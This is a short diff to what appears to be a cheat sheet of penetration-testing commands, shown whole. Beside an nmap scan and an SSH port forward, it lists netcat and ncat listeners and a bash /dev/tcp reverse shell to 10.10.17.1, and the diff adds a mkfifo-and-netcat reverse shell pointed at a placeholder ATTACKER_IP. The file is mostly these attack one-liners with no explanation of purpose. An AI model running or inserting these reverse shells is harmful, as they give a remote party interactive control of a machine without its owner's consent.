@@ -6,6 +6,7 @@ nmap -O -v scanme.nmap.org
 ssh -L 8000:localhost:3306 exampleuser@exampleserver
 
 nc -lvnp 4444
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
 
 ncat -l -p 1337
 /bin/bash -i >& /dev/tcp/10.10.17.1/1337 0>&1
